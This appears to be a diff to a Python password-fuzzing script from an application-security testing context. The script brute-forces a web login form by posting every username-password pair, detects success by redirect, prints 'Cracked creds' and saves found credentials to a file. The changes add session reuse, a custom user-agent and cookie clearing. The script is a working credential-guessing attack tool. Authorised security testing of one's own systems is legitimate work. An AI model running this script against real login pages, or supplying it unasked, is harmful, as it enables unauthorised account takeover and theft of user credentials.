@@ -29,20 +29,26 @@ if not r.status_code == 200:
 cracked_accounts = []
 
 cnt = 0
-
+session = requests.session()
 for uname in unames:
     for pw in passwords:
-        r = requests.post(default_url + login_route, data = {'username': uname, 'password': pw, 'Destination': ''})
+        r = session.post(default_url + login_route, \
+                         data = {'username': uname, 'password': pw, 'Destination': ''}, \
+                         headers = {'user-agent': 'V1AppSec-PasswordFuzzer'})
         cnt = cnt + 1
         update = "working...{0} of {1} requests made\r".format(cnt, total_requests)
         print(update, end="", flush=True)
         if len(r.history) == 0:
             continue
         combo = "{0}:{1}".format(uname, pw)
+        print("Cracked creds: {0}".format(combo + " " * 100))
         cracked_accounts.append(combo)
-
+        session.cookies.clear()
 
 if len(cracked_accounts) > 0:
     file = open("blackbox_cracked_accounts.txt", "w")
     for account in cracked_accounts:
-        file.write(account)
+        file.writelines(account)
+    file.close()
+
+print()
